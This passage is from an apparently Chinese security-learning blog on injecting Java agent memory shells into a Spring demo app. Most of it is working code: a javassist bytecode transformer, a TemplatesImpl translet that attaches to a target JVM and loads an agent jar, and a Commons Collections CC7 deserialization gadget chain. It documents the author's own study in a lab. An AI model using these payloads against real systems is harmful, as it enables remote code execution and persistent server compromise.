            ClassPool cp <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>classBeingRedefined <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                ClassClassPath ccp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassClassPath</span><span class="token punctuation">(</span>classBeingRedefined<span class="token punctuation">)</span><span class="token punctuation">;</span>
                cp<span class="token punctuation">.</span><span class="token function">insertClassPath</span><span class="token punctuation">(</span>ccp<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            CtClass ctc <span class="token operator">=</span> cp<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>editClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            CtMethod method <span class="token operator">=</span> ctc<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>editMethodName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            String code <span class="token operator">=</span> <span class="token string">"System.out.println(\"hello before world\");"</span><span class="token punctuation">;</span>
            method<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ctc<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> bytes<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>理论上就能让hello world项目在输出hello world之前输出hello before world了（事实上也是这样的，就是从代码到成功运行踩了一万个坑）</p>
<h2 id="agent到内存马"><a href="#agent到内存马" class="headerlink" title="agent到内存马"></a>agent到内存马</h2><p>这个是今天学习的主要目的。先知那篇文章到后面简单的讲述了内存马的注入过程，就是找到目标函数并用javassist进行字节码修改。整体似乎没有太大的问题。不过与此同时我还看了ha1师傅的博客，他的博客里提到了一个我觉得应该考虑的问题。</p>
<p>因为内存马注入实际上是在目标上执行我们的attacher，而该类在一般情况下不会被加载，但事实上该类又普遍存在于自带环境中，所以在attacher中应该进行额外的类加载以确保目标可以进行agent注入</p>
<p>复制一下代码并简单魔改，他的那个加载路径有点怪，把java home的jre替换成lib？我感觉应该就是在java home后面加上lib。。。</p>
<p>这样子就能保证不给自己加一堆buff也能运行了，也保证了远程直接用templateImpl之类的东西打的时候能不会出现class not found之类的事情<br>templateImpl的payload类</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>DOM<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>TransletException<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>AbstractTranslet<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span>DTMAxisIterator<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span>SerializationHandler<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLClassLoader<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentAttachClass</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            File toolsPath <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.home"</span><span class="token punctuation">)</span> <span class="token operator">+</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token string">"lib"</span> <span class="token operator">+</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">.</span>separator <span class="token operator">+</span> <span class="token string">"tools.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"java.home"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>toolsPath<span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            URL url <span class="token operator">=</span> toolsPath<span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            URLClassLoader classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>url<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">// 利用URLClassloader获取tools.jar</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> MyVirtualMachine <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.sun.tools.attach.VirtualMachine"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> MyVirtualMachineDescriptor <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.sun.tools.attach.VirtualMachineDescriptor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">// 反射获取VirtualMachineDescriptor和VirtualMachine</span>
            Method listMethod <span class="token operator">=</span> MyVirtualMachine<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"list"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
            List<span class="token operator">&lt;</span>Object<span class="token operator">></span> list <span class="token operator">=</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">)</span> listMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>MyVirtualMachine<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//反射获取VirtualMachine.list()</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Running JVM Start.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                Object o <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                Method displayName <span class="token operator">=</span> MyVirtualMachineDescriptor<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"displayName"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
                String name <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span> displayName<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">//  反射获取displayName</span>
                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"jvm name: "</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"org.z33.springdemo.SpringDemoApplication"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"target found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">// 对比name是否与需要注入的一致</span>
                    Method getId <span class="token operator">=</span> MyVirtualMachineDescriptor<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    String id <span class="token operator">=</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String<span class="token punctuation">)</span> getId<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">// 反射获取pid</span>
                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"id >>> "</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    Method attach <span class="token operator">=</span> MyVirtualMachine<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"attach"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    Object vm <span class="token operator">=</span> attach<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>id<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">// 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接</span>
                    Method loadAgent <span class="token operator">=</span> MyVirtualMachine<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"loadAgent"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//                    String path = "D:\\Java\\projects\\JavaAgentTest\\out\\artifacts\\JavaAgentTest_jar\\JavaAgentTest.jar";</span>
                    String path <span class="token operator">=</span> <span class="token string">"D:\\Java\\projects\\JavaAgentTest\\target\\JavaAgentTest-1.0-SNAPSHOT.jar"</span><span class="token punctuation">;</span>
                    loadAgent<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>path<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">// 使用loadAgent注入</span>
                    Method detach <span class="token operator">=</span> MyVirtualMachine<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"detach"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    detach<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>不过这个路径不知道是不是不同环境会各自不同呢？<br>以及还需要考虑的一个问题是还得提前把这个agent jar包写到目标服务器上。有点麻烦（不过一开始的初衷只是学一下agent技术的来着，内存马我看大伙都说直接反射调用一些奇怪的接口加filter之类的东西写内存马的，和这种直接改字节码的还是有所区别）</p>
<p>SprintBoot不会写，幸好idea自带超级模板，这里直接复制ha1师傅的代码</p>
<p>把CC7和TemplateImpl缝合一下打TemplateImpl。为什么要缝合一下呢，我也不知道，就是想缝合一下试试</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TrAXFilter<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TransformerFactoryImpl<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>ClassPool<span class="token punctuation">;</span>
<span class="token keyword">import</span> javassist<span class="token punctuation">.</span>CtClass<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InstantiateTransformer<span class="token punctuation">;</span>
<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>

<span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CCTemplateImpl</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
        ClassPool pool <span class="token operator">=</span> ClassPool<span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        CtClass ctClazz <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AgentAttachClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> ctClazz<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">;</span>
        TemplatesImpl templatesImpl <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field bf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> targetByteCodes<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// 进入 defineTransletClasses() 方法需要的条件</span>
        Field nf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        nf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field cf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field tf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> rubbish <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//等会反射改，不然又打自己</span>
        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>TrAXFilter<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> Templates<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> templatesImpl <span class="token punctuation">}</span> <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>rubbish<span class="token punctuation">)</span><span class="token punctuation">;</span>

        Map innerMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        Map innerMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
        Map lazyMap1 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap1<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazyMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        Map lazyMap2 <span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap2<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazyMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment" spellcheck="true">// Use the colliding Maps as keys in Hashtable</span>
        Hashtable hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap2<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        Field f <span class="token operator">=</span> transformerChain<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// Needed to ensure hash collision after previous manipulations</span>
        lazyMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> hashtable<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里踩了一个究极大坑，后续另开文章细说</p>
<p>照抄ha1师傅的agentmain和Transformer即可打通</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>果然要多动手，一动手就踩了一万个坑。。。纯看文章不动手就不会踩坑了</p>
